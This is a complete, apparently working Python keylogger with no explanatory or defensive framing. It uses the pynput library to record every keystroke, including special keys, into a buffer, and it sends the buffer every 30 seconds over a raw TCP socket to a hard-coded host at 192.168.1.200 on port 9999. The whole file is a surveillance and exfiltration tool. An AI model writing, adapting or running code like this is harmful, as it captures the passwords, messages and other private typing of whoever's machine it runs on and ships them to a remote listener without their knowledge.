from pynput import keyboard
import socket
import threading

buffer = []

my_laptop = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_laptop.connect(("192.168.1.200", 9999))

def on_press(key):
    try:
        buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            buffer.append(" ")
        elif key == keyboard.Key.enter:
            buffer.append("\n")
        elif key == keyboard.Key.backspace:
            buffer.append("[BACKSPACE]")
        elif key == keyboard.Key.esc:
            buffer.append("[ESCAPE]")
        else:
            buffer.append(f"[{key}]")
                
def keyboard_listener():
    listener = keyboard.Listener(on_press=on_press,on_release=on_release)
    listener.start() 
    listener.join()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def compiler():
    if buffer:
        try:
            data = "".join(buffer)
            data = data.encode()
            my_laptop.send(data)
            buffer.clear()
        except:
            pass
    loop = threading.Timer(30, compiler)
    loop.start()

threading.Timer(30, compiler).start()
keyboard_listener()
